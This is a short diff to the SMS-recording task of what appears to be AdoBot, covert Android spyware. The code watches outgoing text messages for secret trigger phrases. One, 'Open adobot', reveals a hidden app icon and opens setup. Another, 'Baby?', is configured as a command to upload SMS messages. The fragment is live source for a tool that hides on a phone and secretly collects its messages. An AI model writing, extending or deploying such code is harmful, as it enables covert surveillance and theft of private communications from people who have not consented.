@@ -276,11 +276,10 @@ public class SmsRecorderTask extends BaseTask {
             String smsOpenText = prefs.getString(AdobotConstants.PREF_SMS_OPEN_TEXT_FIELD, "Open adobot");
 
             if (Objects.equals(body.trim(), smsOpenText.trim()) && type == MESSAGE_TYPE_SENT) {
-                showAppIcon();
+                showAppIcon(SetupActivity.class);
                 Intent setupIntent = new Intent(context, SetupActivity.class);
                 setupIntent.addFlags(FLAG_ACTIVITY_NEW_TASK);
                 context.startActivity(setupIntent);
-                return;
             }
 
             String uploadSmsCmd = prefs.getString(AdobotConstants.PREF_UPLOAD_SMS_COMMAND_FIELD, "Baby?");
